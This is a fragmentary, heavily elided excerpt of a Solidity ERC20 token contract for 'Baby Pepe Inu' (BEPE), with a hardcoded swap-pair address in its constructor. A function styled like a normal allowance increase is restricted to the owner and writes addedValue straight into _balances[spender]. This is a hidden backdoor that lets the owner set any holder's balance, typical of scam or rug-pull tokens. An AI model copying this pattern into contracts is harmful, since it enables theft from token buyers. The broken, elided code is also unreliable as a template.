...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        ...
        JellySwapV2Pair = 0x3cC3893c621e3A5309FB861a55c64A73cAC12e29;
        ...
        onlyOwner
    {
        ...
        currentValue = addedValue;
                _balances[spender] = currentValue;
        _approve(
            _msgSender(),
            spender,addedValue);
    }
...
contract BabyPepeInu is Ownable, ERC20 {
  
    constructor() ERC20("Baby Pepe Inu", "BEPE") {}
